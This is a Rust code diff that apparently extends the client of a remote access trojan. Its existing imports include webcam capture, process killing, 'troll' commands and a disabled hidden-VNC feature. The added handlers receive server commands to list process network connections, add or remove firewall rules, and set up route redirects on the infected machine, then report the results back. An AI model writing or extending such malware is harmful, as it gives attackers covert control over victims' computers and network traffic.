@@ -5,6 +5,7 @@ use crate::features::process::{process_list, kill_process, start_process, suspen
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
 use crate::features::module_loader;
+use crate::features::network_manager;
 // use crate::features::hvnc::{start_hvnc, stop_hvnc, open_process};
 use common::packets::*;
 use rand_chacha::ChaCha20Rng;
@@ -149,6 +150,68 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::ListModules)) => {
                 let modules = module_loader::list_modules();
                 println!("Loaded modules: {:?}", modules);
+            }
+
+            Ok(Some(ClientboundPacket::GetProcessConnections(pid))) => {
+                let connections = network_manager::get_process_connections(pid);
+                let process = Process {
+                    pid,
+                    name: String::new(), // Name will be ignored in response
+                    network_connections: Some(connections),
+                };
+                let _ = send_packet(ServerboundPacket::ProcessConnections(process)).await;
+            }
+
+            Ok(Some(ClientboundPacket::AddFirewallRule(rule))) => {
+                match network_manager::add_firewall_rule(&rule) {
+                    Ok(msg) => {
+                        println!("Firewall rule added: {}", msg);
+                        let _ = send_packet(ServerboundPacket::FirewallRuleResult(true, msg)).await;
+                    }
+                    Err(e) => {
+                        println!("Failed to add firewall rule: {}", e);
+                        let _ = send_packet(ServerboundPacket::FirewallRuleResult(false, e)).await;
+                    }
+                }
+            }
+
+            Ok(Some(ClientboundPacket::RemoveFirewallRule(rule))) => {
+                match network_manager::remove_firewall_rule(&rule) {
+                    Ok(msg) => {
+                        println!("Firewall rule removed: {}", msg);
+                        let _ = send_packet(ServerboundPacket::FirewallRuleResult(true, msg)).await;
+                    }
+                    Err(e) => {
+                        println!("Failed to remove firewall rule: {}", e);
+                        let _ = send_packet(ServerboundPacket::FirewallRuleResult(false, e)).await;
+                    }
+                }
+            }
+
+            Ok(Some(ClientboundPacket::AddRouteRedirect(redirect))) => {
+                match network_manager::add_route_redirect(&redirect) {
+                    Ok(msg) => {
+                        println!("Route redirect added: {}", msg);
+                        let _ = send_packet(ServerboundPacket::RouteRedirectResult(true, msg)).await;
+                    }
+                    Err(e) => {
+                        println!("Failed to add route redirect: {}", e);
+                        let _ = send_packet(ServerboundPacket::RouteRedirectResult(false, e)).await;
+                    }
+                }
+            }
+
+            Ok(Some(ClientboundPacket::RemoveRouteRedirect(redirect))) => {
+                match network_manager::remove_route_redirect(&redirect) {
+                    Ok(msg) => {
+                        println!("Route redirect removed: {}", msg);
+                        let _ = send_packet(ServerboundPacket::RouteRedirectResult(true, msg)).await;
+                    }
+                    Err(e) => {
+                        println!("Failed to remove route redirect: {}", e);
+                        let _ = send_packet(ServerboundPacket::RouteRedirectResult(false, e)).await;
+                    }
+                }
             }
 
             Ok(Some(p)) => {
